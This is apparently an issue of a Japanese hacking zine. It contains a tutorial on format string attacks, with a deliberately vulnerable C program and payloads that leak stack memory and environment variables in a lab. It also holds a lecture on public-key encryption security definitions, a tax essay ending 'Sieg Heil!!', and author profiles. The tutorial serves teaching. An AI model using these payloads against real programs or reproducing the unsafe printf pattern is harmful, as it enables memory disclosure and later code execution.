+　ところでワイドショーを見て有名人の脱税に怒りを感じている多くの視聴者は、
+一円も税金を払っていない専業主婦の方々。その一方で、多額の脱税をした人は
+それでも平均的な日本人よりはるかに多くの税金を払っているものと思われます。
+ 「公平な報道」を旨とするならば、こうした事実も正確に伝えるべきなのですが、
+朝日を始め、新聞には到底期待できません。
+　ネットが新たな情報ツールとして、もてはやされて数年が経ちますが、現状は
+何一つ変わっていない事実に私達は愕然とするしかありません。
+　皆様も「税金泥棒！」と公務員を罵ったり、「長者番付」を妬んだりすること
+も多いと思いますが、一人一人が税の本質は何か？と考えてみると良いかと思い
+ます。
+
+　短絡的にならず、「身近な経済学」について考えて学んでみましょう！
+
+　それではAuf Wiedersehen!!
+　Sieg Heil!!
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第4章: はじめてのハッキング　～フォーマットストリング攻撃1～  ---
+
+著者：Defolos
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　前回はBOFを利用してプログラム実行の流れを変更しました。今回は任意プログ
+ラムを実行できるバグとして知名度でBOFと双璧をなすフォーマットストリング攻
+撃について説明したいと思います。この攻撃手法はフォーマットストリングバグ
+というバグをついた攻撃手法であり、長年その存在が知られていながら致命的な
+脅威にはならないであろうと考えられ放置されてきました。しかし、権限奪取が
+行えることが示されてから特に注目されるようになり、今日では厳しくバグチェ
+ックをするべきバグのひとつとなっています。プログラムの流れを変えることの
+できる攻撃手法ですが、BOFとはまったく別の原理を用いています。 
+
+
+■0x02.) フォーマットストリングとは
+
+　フォーマットストリングは書式指定文字列と和訳され、printf関数などの引数
+として利用される文字列のことです。実例としては次のようなものです。printf
+()に渡される第一引数の部分「"test: a=%d, a=%c, b=0x%x\n"」がフォーマット
+ストリングです。
+
+-----
+int a=65, b=12;
+printf("test: a=%d, a=%c, b=0x%x\n", a, a, b);
+-----
+
+　上記の例をコンパイルし実行すると「test: a=65, a=A, b=0xc」と表示されま
+す。お気づきのように、%dや%xなどの記号が100やcに置き換わっています。prin
+tf関数本来の動作は引数として渡された文字列を画面に表示することですので「
+test: a=%d, b=0x%x\n」と表示されるように感じますが、printf()などの関数は
+フォーマットストリングが引数として渡された場合は%dなどの記号を適宜置き換
+えて表示するようになっています。フォーマットストリングの左端から探索して、
+初めに出てきた%記号の部分を第2引数に指定された変数の値に置き換え、2番目に
+出てきた%記号の部分を第3引数に指定された変数の値に置き換えます。
+
+●変換指定文字
+
+　フォーマットストリングは%の部分を、それに対応する変数の値に置き換えて表
+示します。%の後にはアルファベット1文字が続き、その文字によって出力する時
+の形式を変更できます。例えば「%d」というように%の後にdを付加すると、対応
+する変数を10進数の数値で表示します。同様に「%c」と指定すれば対応する変数
+を文字として表示します。文字コードにはASCIIコードが使われますので、65とい
+う数値は「A」に変換されて表示されます。次に変換指定文字のリストを示します。
+
+----------------------
+%d   10進数の数値
+%o   8進数の数値
+%x   16進数の数値
+%c   1文字
+%s   文字列
+%f   実数形式
+----------------------
+
+　先ほど例として挙げたコードを少し変更し、次のようなコードを記述します。
+
+-----
+int a=65, b=12;
+printf("test: a=%f, b=%o\n", a, b);
+-----
+
+　このコードをコンパイルして実行すると「test: a=65.0000, b=14」と表示され
+ます。前回は変数aの中身を10進数と文字として出力しましたので、65とAが表示
+されました。今回は実数を指定しましたので65.0000のように実数形式で表示され
+ました。同様に、変数bも今回は8進数を指定していますので14と出力されていま
+す。このように、フォーマットストリングは出力の形式を簡単に指定することの
+できる便利な仕組みなのです。
+
+
+■0x03.) printf関数とフォーマットストリングの動作
+
+　ここではフォーマットストリングをよく利用する、printf()を用いて解説を行
+います。ほかにもフォーマットストリングを利用する関数はありますが、同様の
+動作をしていると考えていただいて結構です。
+
+●関数の呼び出し
+
+　関数を呼び出すときは、戻りアドレスや引数をスタックに積むということを以
+前お話ししました。printf()を呼び出すときも引数をスタックに積んだ後に処理
+が移行されます。例えば「printf("a=%d,b=%d", a, b);」というコードを実行す
+ると、まずスタックに変数bの値が積まれ、次に変数aの値が積まれます。最後に
+「a=%d,b=%d」という文字列が積まれます。
+
+[stack]
+------low
+ret
+------0x0000004
+a=%d,b=%d
+------0x000000d
+a
+------0x0000011
+b
+------high
+
+　printf()の中ではディスプレイへの表示処理を行います。まず、第一引数の部
+分である「a=%d,b=%d」を前から順番に出力していきます。はじめて%を発見した
+場合、第二引数が格納されているアドレス(0x000000d)の内容を読み込んでディス
+プレイに出力し、%を見つけるまで同様に出力していきます。次に%を見つけたと
+きは第三引数が格納されているアドレス(0x0000011)の中身を読み込み、ディスプ
+レイに表示します。第一引数の文字列すべてを表示し終わったらprintf関数の仕
+事は終わりです。
+
+●フォーマットストリングバグ
+
+　フォーマットストリングバグは、フォーマットストリング中の変換指定文字の
+数と引数の数に不一致がある場合に発生するバグです。例えば次のコードをご覧
+ください。
+
+-----
+#include <stdio.h>
+
+int main(int argc, char *argv[]){
+
+    int a=100;
+    printf("%d, %d, %d, %d, %d, %d, %d, %d, %d", a);
+    return 0;
+}
+-----
+
+　フォーマットストリングには変換指定文字が9個出現していますが、printf()に
+渡された引数は変数aのひとつだけです。先ほどの関数呼び出しの手順をここで再
+現すると、重大なバグに気づくと思います。
+　printf関数を呼び出す場合、まず変数aの値がスタックに積まれます。次にフォ
+ーマットストリングである「%d, %d, %d, %d, %d, %d, %d, %d, %d」がスタック
+に積まれprintf()に制御が移ります。
+
+[stack]
+------low
+ret
+------0x0000004
+%d, %d, %d, %d, %d, %d, %d, %d, %d
+------0x0000028
+a
+------0x000002c
+98
+------high
+
+　フォーマットストリングを探索し、はじめの変換指定文字に出会うと第2引数が
+格納されているアドレスの中身に置き換えます。ここまでは前回と同じですが、
+次の変換指定文字に出会ったときに問題が発生します。printf()は引数の個数と
+フォーマットストリング中の変換指定文字の数との整合性は一切関知しません。
+つまり、エラーを出力することはなく、本来なら第三引数が格納されているであ
+ろう場所のアドレスの中身を表示します。上記の例では0x000002c番地の中身であ
+る98が出力されます。実際にコンパイルし実行してみます。
+
+-----
+fa72006@sh<27> gcc -Wall test.c
+test.c: In function `main':
+test.c:7: 警告: フォーマットへの引数が少なすぎます
+fa72006@sh<28> ./a.out
+100, 0, 0, 0, 0, -4196140, 4, 100, 5
+-----
+
+　上記のようにメモリ内のデータが読み出されています。上記の例の場合はメモ
+リの中身が次のようになっているとわかります。アドレスは適当ですが、メモリ
+内に格納されているデータはこの通りです。
+
+[stack]
+------low
+ret
+------0x0000004
+%d, %d, %d, %d, %d, %d, %d, %d, %d
+------0x0000028
+a
+------0x000002c
+0
+------0x0000030
+0
+------0x0000034
+0
+------0x0000038
+0
+------0x000003c
+-4196140
+------0x0000040
+4
+------0x0000044
+100
+------0x000003c
+5
+------high
+
+
+■0x04.) 任意メモリの読み出し
+
+　前の例では、フォーマットストリング中の変換指定文字の数と関数に渡される
+変数の数の不一致はハードコードされていました。一度でも実行すればバグがあ
+ることがわかるので、通常のプログラムにはこのようなバグは存在し得ません。
+しかし、文字列を表示する場合はこのバグが混入する可能性があります。次よう
+なプログラムを用意します。
+
+-----  formatstring.c
+#include <stdio.h>
+
+int main (int argc, char *argv[]){
+
+    char text[1024];
+    static int test_val = -72;
+
+    if(argc != 2){
+        printf("Usage:%s <Output Message>\n", argv[0]);
+        return 0;
+    }
+    strcpy(text, argv[1]);
+
+    printf("Good:\n");
+    printf("%s", text);
+    printf("\n");
+
+    printf("Bad:\n");
+    printf(text);
+    printf("\n");
+
+    printf("[DEBUG] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);
+    return 0;
+}
+-----
+
+　コマンドライン引数として与えられた文字列を2回表示するだけのプログラムで
+すが、printf()に渡している引数に注目ください。1回目の表示では%sでtextを表
+示していますが、2回目の表示ではtextを直接指定して表示しようとしています。
+これをコンパイルして実行すると次のようになります。
+
+-----
+defolos@glazheim:~/Desktop$ ./a.out test
+Good:
+test
+Bad:
+test
+[DEBUG] test_val @ 0x08049654 = -72 0xffffffb8
+-----
+
+　ご覧の通り、両者とも引数として受け取った文字列を出力できていますが、2回
+目の出力部分はフォーマットストリングバグを抱えています。より詳しく説明す
+ると「printf("%s", text);」の「%s」は次の引数で与えられた配列の先頭アドレ
+スを受け取り、そこからNULLまでを文字として出力します。1回目の出力時のスタ
+ックは次のようになっています。
+
+[stack]
+------low
+ret
+------0x0000004
+%s[NULL]
+------0x0000006
+t
+------0x0000007
+e
+------0x0000008
+s
+------0x0000009
+t
+------0x000000a
+.
+------0x000000b
+NULL
+------high
+
+　フォーマットストリングを出力するとき、%sに出会うので第2引数として渡され
+たtext配列のアドレス(0x0000006-0x000000b)をNULLが検出されるまで出力します。
+さらにフォーマットストリングを出力するときも終端はNULLで判別されます。次
+に2回目の出力時のスタックを示します。
+
+[stack]
+------low
+ret
+------0x0000004
+t
+------0x0000006
+e
+------0x0000007
+s
+------0x0000008
+t
+------0x0000009
+.
+------0x000000a
+NULL
+------high
+
+　今回はフォーマットストリングとしてtext配列が渡されていますので、text配
+列のアドレス(0x0000004-0x000000a)を出力します。最終的に0x000000aでNULLに
+出会うので、0x000000aまでをフォーマットストリングだと認識して出力します。
+通常の文字をコマンドライン引数に指定しても特に問題はありませんが、ここに
+変換指定文字を含めるとどうなるでしょう。
+
+-----
+defolos@glazheim:~/Desktop$ ./a.out test%x
+Good:
+test%x
+Bad:
+testbffff550
+[DEBUG] test_val @ 0x08049654 = -72 0xffffffb8
+-----
+
+　スタックの内容が表示されました。これはprintf()がフォーマットストリング
+として与えられたtext配列を出力する際、変換指定文字に出会ったところで、本
+来第二引数が格納されているであろうアドレスをprintf()が読み出しているため
+に起こります。これを利用すれば任意のアドレスの値を出力することができます。
+　次のようにperlスクリプトを使って「%08x.」を50回入力します。全部手で打つ
+のは面倒なのでperlを使ってます。ちなみに、%08xは8桁の16進数で表示するとい
+う変換指定文字です。
+
+-----
+defolos@glazheim:~/Desktop$ ./a.out `perl -e 'print "%08x."x50;'`
+Good:
+%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
+%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
+%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
+%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
+%08x.%08x.%08x.%08x.%08x.%08x.
+Bad:
+bffff450.00000000.4001670c.00000002.00000004.00000000.
+00000000.78383025.3830252e.30252e78.252e7838.2e783830.
+78383025.3830252e.30252e78.252e7838.2e783830.78383025.
+3830252e.30252e78.252e7838.2e783830.78383025.3830252e.
+30252e78.252e7838.2e783830.78383025.3830252e.30252e78.
+252e7838.2e783830.78383025.3830252e.30252e78.252e7838.
+2e783830.78383025.3830252e.30252e78.252e7838.2e783830.
+78383025.3830252e.30252e78.252e7838.2e783830.78383025.
+3830252e.30252e78.
+[DEBUG] test_val @ 0x08049654 = -72 0xffffffb8
+-----
+
+　252e7838という数値の繰り返しが目立ちますが、これは「%08x.」という文字が
+出力されているからです。つまり、78383025がはじめに現れるところからは引数
+として渡された配列のアドレス内容をのぞいているということになります。retと
+引数が格納されているアドレスとの間には多少の隙間がありますが、この隙間の
+サイズはシステムやコンパイラによって変化します。ゆえに、まず攻撃対象のシ
+ステムで任意のメモリの内容を表示するために変換指定文字をいくつ重ねればよ
+いのかを計測します。
+
+-----
+defolos@glazheim:~/Desktop$ ./a.out AAAA`perl -e 'print "%08x."x8;'`
+Good:
+AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
+Bad:
+AAAAbffff520.00000000.4001670c.00000002.00000004.00000000.
+00000000.41414141.
+[DEBUG] test_val @ 0x08049654 = -72 0xffffffb8
+-----
+
+　41という数字は文字では「A」ですので、どうやら8個で良いようです。今回、
+引数のはじめに方にAAAAを渡していますので、41414141という数値が現れた部分
+が引数として渡した配列の開始場所です。つまり、8個目の変換指定文字に%sを記
+述すれば、0x41414141番のアドレスの中身をNULLが出現するまで出力します。%s
+はその変換指定文字が対応する引数のアドレス内を参照する点にご注意ください。
+
+[stack]
+------row
+bffff520 (ret)
+------
+00000000
+------
+4001670c
+------
+00000002
+------
+00000004
+------
+00000000
+------
+00000000
+------
+AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.[NULL] (text)
+------
+....
+------0x41414141
+????
+------high
+
+　とりあえず環境変数の値を出力してみましょう。環境変数のアドレスの求め方
+は次のようにgdbを利用します。
+
+-----
+[Get envaiorment values]
+defolos@glazheim:~/Desktop$ gdb a.out
+(gdb)break main
+(gdb)run
+(gdb)x/20s $esp
+....
+0xbffffad1: ""
+0xbffffad2: "i686"
+0xbffffad7: "/home/defolos/Desktop/a.out"
+0xbffffaf3: "SSH_AGENT_PID=4328"
+0xbffffb06: "SHELL=/bin/bash"
+0xbffffb16: "DESKTOP_STARTUP_ID="
+0xbffffb2a: "TERM=xterm"
+0xbffffb35: "GTK_RC_FILES=/etc/gtk/gtkrc:/home/defolos/.gtkrc-1.2-gnome2"
+0xbffffb71: "WINDOWID=20971594"
+0xbffffb83: "USER=defolos"
+....
+-----
+
+　USERのところを出力してみましょう。アドレスは0xbffffb83であることがわか
+ります。これに15を加算した0xbffffb98が渡すべき引数です。リトルエンディア
+ンを考慮し、下位2文字から順に記述します。8文字目の変換指定文字に%sを指定
+すれば、丁度引数の開始アドレスの中身（\x98\xfb\xff\xbf）に格納されている
+アドレスの内容を表示することができます。
+
+-----
+defolos@glazheim:~/Desktop$ ./a.out `printf "\x98\xfb\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%s
+Good:
+\uffff\uffff\uffff%x.%x.%x.%x.%x.%x.%x.%s
+Bad:
+\uffff\uffff\uffffbffff530.0.4001670c.2.4.0.0.USER=defolos
+[DEBUG] test_val @ 0x08049654 = -72 0xffffffb8
+-----
+
+　上手く出力されていますね。15を加算しなければいけない理由はよくわからな
+いのですが、実行ファイルの名前の長さが増えると環境変数のアドレスは2バイト
+小さい値を指定しなければ参照できないようです。このようにして任意のアドレ
+スの内容を表示することができるのです。
+
+
+■0x05.) おわりに
+
+　今回みてきたように、フォーマットストリングバグを応用すればメモリ内の値
+をのぞき見ることができます。しかし、ハッキングの目的は本質的にメモリ内容
+を書き換えることにあります。関数の戻りアドレスが格納されているメモリ番地
+をペイロードの格納されているメモリ番地に書き換えることでプログラムの流れ
+を変えることができ、権限の奪取が行えるのです。ゆえに、任意にメモリ内の書
+き換えが行えないバグは利用価値が低いと言えます。実は、フォーマットストリ
+ングバグは任意にメモリを書き換えることのできるバグなのです。その手法は次
+回お話しすることとしますので、お楽しみに。
+　それではまたお会いしましょう。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第5章: 基礎暗号学講座・第15回 ～公開鍵暗号の安全性の強弱～  ---
+
+著者：IPUSIRON
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　WB39では、仮定の強弱について解説した。今回は安全性の強弱について解説す
+る。
+　なぜ安全性の強弱の前に仮定の強弱を解説したのかと言うと、仮定と安全性は
+密接な関係を持つからである。例えば、強い仮定を前提にすれば、強い安全性を
+持たせやすいことが一般的に言える。
+　仮定と安全性のどちらを重視するのかは暗号設計者や暗号実装者の選択に依存
+するが、どちらの立場であっても理想的な暗号とは、弱い仮定を前提にして、強
+い安全性を持つものである。
+
+　暗号のおける重要な要素として、安全性・仮定の他に、モデルと効率性も存在
+する。残りの2つに関しては今後WBで紹介するつもりなので、今回は仮定と安全性
+のみに注目してもらいたい。
+
+
+■0x02.) 公開鍵暗号の安全性
+
+　公開鍵暗号の安全性は2つの観点で捉えることができる。1つ目が暗号化の安全
+性レベル、2つ目が敵の攻撃法（攻撃能力）である。
+
+　暗号化の安全性レベルは、次の4種類が存在する。
+
+・一方向性（One-Wayness：OW）
+・強秘匿性（Semantic Security：SS）
+・識別不可能性（Indistingushability：IND）
+・頑強性（Non-Malleability：NM）
+
+　この並びには意味があり、下のものほど安全性レベルが高い。例えば、OWより
+もNMの方が安全性が高い。その理由を知るためには、各安全性レベルの意味を知
+らなければならない。
+
+　また、敵の攻撃法は、次の3種類が存在する。
+
+・選択平文攻撃（Chosen Plaintext Attack：CPA）
+・選択暗号文攻撃（Chosen Ciphertext Attack：CCA）
+・適応的選択暗号文攻撃（Adaptive Chosen Ciphertext Attack：CCA2）
+
+　この並びにおいても、下のものほど強い攻撃法であることを意味する。
+
+　よって、安全性レベルが4種類、敵の攻撃法が3種類あるため、公開鍵暗号の安
+全性は合計12種類存在する。このことは次の表を見れば一目瞭然であろう。なお、
+「安全性レベル」と「敵の攻撃法」の組はハイフンを挟んで表現される。今後も
+この表現方法を使うので覚えて欲しい。
+
+---------------------------------------
+|    |OW     |SS     |IND     |NM     |
+|----+-------+-------+--------+-------|
+|CPA |OW-CPA |SS-CPA |IND-CPA |NM-CPA |
+|----+-------+-------+--------+-------|
+|CCA |OW-CCA |SS-CCA |IND-CCA |NM-CCA |
+|----+-------+-------+--------+-------|
+|CCA2|OW-CCA2|SS-CCA2|IND-CCA2|NM-CCA2|
+---------------------------------------
+
+　今の時点でこの表においてわかることは、表の左上より右下の方が安全性が高
+いということである。つまり、NM-CCA2が最強の安全性ということである。
+
+
+■0x03.) 公開鍵暗号の安全性の等価性
+
+　先ほど示した表を再掲しておく。
+
+---------------------------------------
+|    |OW     |SS     |IND     |NM     |
+|----+-------+-------+--------+-------|
+|CPA |OW-CPA |SS-CPA |IND-CPA |NM-CPA |
+|----+-------+-------+--------+-------|
+|CCA |OW-CCA |SS-CCA |IND-CCA |NM-CCA |
+|----+-------+-------+--------+-------|
+|CCA2|OW-CCA2|SS-CCA2|IND-CCA2|NM-CCA2|
+---------------------------------------
+
+　この表において部分的に等価性がわかっているところもある。例えば、NM-CCA2
+とIND-CCA2は等価であることがわかっている。公開鍵暗号の安全性について議論
+において、IND-CCA2であるか否かが注目されるのはこのためである。
+
+　さらに、知られている事実として、「NM-CCAはIND-CCAよりも真に強い」などが
+挙げられる。このように隣同士が等価であったり、真に強いことがわかっている
+例が存在する。
+
+
+■0x04.) すでに登場した公開鍵暗号の安全性について
+
+　これまでのWBにおいて、いくつかの公開鍵暗号を紹介してきた。これらはどの
+安全性を満たすのかを復習しておく。
+
+・教科書的RSA暗号はRSA仮定の下で、OW-CPA安全である。
+・ElGamal暗号はCDH仮定の下で、OW-CPA安全である。
+・拡張ElGamal暗号はDDH仮定の下で、IND-CPA安全である。
+
+　まだ拡張ElGamal暗号の鍵生成アルゴリズム・暗号化アルゴリズム・復号アルゴ
+リズムの仕様については言及していないが、結果についてはWB39で紹介したので、
+ここで載せた。
+
+
+■0x05.) OW
+
+　公開鍵暗号が一方向性（OW）の意味で安全とは、公開鍵と暗号文から、平文全
+体を求めることが困難であることとして定義される。
+
+　そして、xとfからy=f(x)を計算するのが容易であるが、y=f(x)とfからxを求め
+ることが困難であるとき、fは一方向性関数という。
+
+
+■0x06.) SS
+
+　公開鍵暗号が強秘匿性（SS）の意味で安全とは、暗号文から平文に関するどの
+ような部分情報が漏れないこととして定義される。
+
+　強秘匿性の意味で安全とは次のようにイメージできる。平文mを紙に書いて、そ
+れを封筒に入れてしまう。この封筒は暗号文cそのものである。敵はこの封筒から、
+平文に関し何ら情報を得ることができない。
+　言い換えれば、敵は封筒（もちろん内部は見えない）から計算できることは、
+封筒なしでも計算できるということである。
+
+　よって、強秘匿性は次のように定義し直すことができる。任意の確率的多項式
+時間アルゴリズムである敵Aに対し、ある確率的多項式時間アルゴリズムA'が存在
+し、Aが暗号文cから求めたものと同じものを、A'はcを使うことなく求めることが
+できるときに、強秘匿性（SS）の意味で安全という。記号で表現すれば、「∀A,
+∃A';A(pk,c)=A'(pk)」になるだろう。
+
+　平文の部分情報を求めることと平文の完全情報を求めることでは、部分情報を
+求めることの方が敵にとって仕事して楽である。そういう状況においても、敵に
+とってやりやすい仕事ができないということがSSを意味するので、OWよりもSSの
+方が強い安全性になる。
+
+【注意】指摘がありましたが、平文空間が小さいときはそうとは言い切れないこ
+とが起こります。例えば、極端に2ビットの空間であったり、c×log(n)ビット（
+cは定数）の空間などの場合です。
+
+
+■0x07.) IND
+
+　公開鍵暗号が識別不可能性（IND）の意味で安全とは次のようにイメージできる。
+平文m_0を書いた紙が入った封筒C_0と、平文m_1を書いた紙が入った封筒C_1が存
+在したときに、2つの封筒は外見からまったく見分けがつかない。
+　言い換えれば、2つのうちの1つの封筒が与えられたときに、中身の紙にm_0,_m1
+のどちらが書かれているかをわからないときに、識別不可能ということである。
+
+　実はINDとSSの等価性は証明されている。SSは意味的には理解しやすい定義であ
+り、INDは証明に使いやすい定義である。よって、暗号がSSの意味で安全であるこ
+とを証明したい場合は、INDの定義で証明することが多い。
+
+　INDの定義で証明するときは、敵とチャレンジャーの2者による次のようなゲー
+ムで考える。
+
+1：チャレンジャーは鍵生成アルゴリズムKeyGenを起動して、秘密鍵skと公開鍵pk
+を生成する。
+
+2：チャレンジャーは公開鍵pkを敵に送信する。
+
+3：敵は2つの平文m_0,m_1を自由に選び、両方をチャレンジャーに送信する。
+
+4：チャレンジャーは1ビットのbをランダムに選択する。暗号化アルゴリズムEnc
+にm_bと秘密鍵skを入力し、暗号文c_bを生成し、敵に送信する。
+
+5：敵はc_bを受信したら、bの推測値~bを計算して、出力する。
+
+　このようなゲームにおいて、b=~bならば敵の勝ち、b≠~bならばチャレンジャー
+の勝ちである。
+　ここで、bは1ビットなので、敵は勘でbを選んだとしても、1/2の確率で敵は勝
+つことができる。つまり、暗号としては敵の勝つ確率が1/2になることが一番望ま
+しい。よって、公開鍵暗号が識別不可能性の意味で安全とは、任意の確率的多項
+式時間アルゴリズムである敵が、無視できるくらい小さいεが存在するときに、
+次の不等式が成り立つことである。
+
+|Pr(敵が勝つ）-1/2|≦ε
+
+　ちなみに、Prは確率、| |は絶対値を意味している。
+
+　INDとSSの等価性が知られているが、その直感的な証明は次のURLに載せた。
+
+http://akademeia.info/index.php?%B8%F8%B3%AB%B8%B0%B0%C5%B9%E6%B7%CF%A4%CE%B0%C2%C1%B4%C0%AD%C4%EA%B5%C1#a462b79c
+
+
+■0x07.) NM
+
+　公開鍵暗号が頑強性（NM）の意味で安全とは、暗号文から別の妥当な暗号文を
+生成できないことである。もう少し厳密に言うと、ある平文mの暗号文cが与えら
+れたときに、平文mと関係のあるm'の暗号文c'を生成できないことである。
+
+　ここで述べている関係とは、明らかな関係については除いている。明らかな関
+係とはmとm'のビット長が同じときなどである。同じビット長は公開情報であり、
+どんな敵であってもmと同じビット長を持つm'の暗号文を生成することは容易であ
+る。このような明らかな関係は除くのである。
+　それでは明らかでない関係というのはどのようなものだろうか。例えば、m'=
+m+1という関係やm'はmのビット反転といった場合などである。もし敵がこのよう
+な明らかでない関係を満たす暗号文を生成することができてしまうと、公開鍵暗
+号をビルディングブロックとして利用するアプリケーションによっては大きな問
+題になってしまうのである。
+
+
+■0x08.) CPA
+
+　CPA（選択平文文攻撃）とは、敵が自分自身が選択した平文に対応する暗号文を
+知ることができる状況における攻撃である。つまり、CPA攻撃者は、公開鍵とター
+ゲットとなる暗号文を知ることができるのである。
+　CPAの場合、敵は平文を送信すると暗号文を返してくれる存在を利用できること
+を意味する。平文をクエリーとして受け取り、暗号文を返す存在を暗号化オラク
+ル（Encryption Oracle：EO）という。つまり、CPA攻撃者は暗号化オラクルを使
+えるということになる。
+
+
+■0x09.) CCAとCCA2
+
+　CCA（選択暗号文攻撃）とは、暗号化オラクルを利用する前に、自分自身が選択
+した暗号文に対応する平文を知ることができる状況における攻撃である。このよ
+うに暗号文をクエリーとして受け取り、平文を返す存在を復号オラクル（Decryp
+tion Oracle：DO）という。つまり、CCA攻撃者は復号オラクルを使ってから（何
+度も問い合わせ可能）、暗号化オラクルを利用できる。
+
+　一方、CCA2（適応的選択暗号文攻撃）とは、復号オラクルを利用してから（何
+度も問い合わせ可能）、暗号化オラクルを利用し、その後でも復号オラクルを利
+用できる（何度も問い合わせ可能）状況における攻撃である。ただし、暗号化オ
+ラクルで受け取った暗号文を、その後で復号オラクルに送信してはいけない。な
+ぜならば、もし送信できてしまえば、敵は明らかにbを特定できまうからである。
+
+　CCA2攻撃者の動きは次の図1のようになる。
+
+（図1）http://s-akademeia.sakura.ne.jp/main/image9/ind-cca2.jpg
+
+
+■0x0A.) 終わりに
+
+　今回のWBでは公開鍵暗号の安全性について定義した。このような安全性の定義
+の仕方は、署名の安全性の理解にも役に立つはずである。
+
+　次回のWBでは拡張ElGamal暗号の仕様を定義し、その後でDDH仮定の下でIND-CP
+A安全であることを証明する予定である。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+ --- 第6章: お知らせ ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://wizardbible.org/）では随時、執筆ライターを募集して
+います。
+　扱う内容のテーマは広義での「under ground」です。例えばハッキングやセキ
+ュリティからピッキングなどと幅広い内容を考えています。また特殊な職業や趣
+味の解説などでも構いません。
+　一回きりでも構いません。また必ず毎回連載する義務もありませんので、でき
+る範囲で構いません。気軽に声をかけてください。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
+
+http://wizardbible.org/wbQandA.html
+
+○Wizard Bibleに参加希望の方は気軽にメール（ipusiron@gmail.com）ください。
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第7章: 著者プロフィール ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■Kenji Aiko（nurupo ver）
+●Job: engineer
+●Web: http://ruffnex.oc.to/kenji/
+●Mail: kenji@ruffnex.oc.to
+●Comment:
+　最近、バリバリのオブジェクト指向C++プログラマと仕事する機会が多いのです
+が、処理速度を重視する関係上、C言語での開発をお願いしたら「コンストラクタ
+ないのが痛い」とか「ええー？　途中で変数定義できないんですか？」とか「st
+ring型ダメなの？」とか、かなりの部分で不自由を感じているっぽいです。なん
+というか…、いろいろと世代のギャップを感じる今日この頃です。ちなみに彼は、
+今年で40歳らしいです。
+●好きな映画・お勧めの映画:
+・「ショーシャンクの空に」
+　どんなに悲惨な状況でも前を向いて進んでいけば道は開けるという話。登場人
+物がみんな良い味出してる。特に図書係をしていたじっちゃんはよかった。1000
+里の道も一歩から。
+・「ライフイズビューティフル」
+　本当に悲惨な状況ならどんなに頑張っても道は開けないけど、それでも頑張る
+意味はある、という話。お父さんがカッコ良すぎてもう泣きそうです。たぶん映
+画史上もっともカッコいいお父さんです（あんま映画みないけど（汗））。
+
+
+■金床
+●Job: プログラマー
+●Web: http://guardian.jumperz.net/, http://www.jumperz.net/
+●Mail: anvil@jumperz.net
+●Comment:
+　最近はいろんなｱﾌﾟﾘの負荷ﾃｽﾄでｸｱｯﾄﾞｺｱ+8GBのﾃｽﾄﾏｼﾝ3台をﾌﾙ稼働させてます
+ヽ(´ー`)ノ電気代どうなってるのｗｗｗ　64bitLinuxﾓｴｰ
+●好きな映画・お勧めの映画: 
+　映画はかなり好きで、見まくってます。特に好きなのは「バニラ・スカイ」「
+12モンキーズ」「セブン」ですね。また、「パトリオット・ゲーム」や「トータ
+ル・フィアーズ」などのジャック・ライアン・シリーズもかなり好きです。最近
+では「コラテラル」がかなり気に入ってます。
+　それにしても、ハッカーやハッキングが出てくる映画ってやたらつまらないで
+すよね。何とかならないのでしょうか…。
+　なんか前にも見たことがある気がしますが、気にしないヽ(´ー`)ノ
+　ってコピペでいつも終わらせるのもｱﾚでつね(;´Д`)
